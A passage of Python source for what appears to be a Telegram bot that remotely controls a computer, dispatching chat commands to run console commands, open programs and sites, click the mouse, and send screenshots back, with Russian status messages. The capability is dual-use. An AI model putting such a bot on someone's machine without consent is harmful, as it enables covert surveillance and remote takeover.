                    bindAPI.useConsole(str(funcCode[0]), int(funcCode[1]), int(funcCode[2]))

                elif i.startswith('openSite'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.openSite(info[1])

                elif i.startswith('sendScreenshot'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.sendScreenshot(int(info[1]))

                elif i.startswith('sendMessage'):
                    info = i.split('=', maxsplit=1)
                    funcCode = info[1].split(',', maxsplit=1)
                    bindAPI.sendMessage(int(funcCode[0]), str(funcCode[1]))

                elif i.startswith('openProgram'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.openProgram(str(info[1]))

                elif i.startswith('clickMouse'):
                    info = i.split('=', maxsplit=1)
                    bindAPI.clickMouse(str(info[1]))

                elif (i == '' or None):
                    continue
                
                else:
                    bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nДанной функции не существует!*", parse_mode='Markdown')
                    return

            except IndexError:
                bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nПроверьте аргументы строки!*", parse_mode='Markdown')
                return
        
        error = 0
        return bot.send_message(message.chat.id, '☑️ *Бинд был успешно использован!*', parse_mode='Markdown')

if __name__ == '__main__':
    bot.infinity_polling(none_stop = True)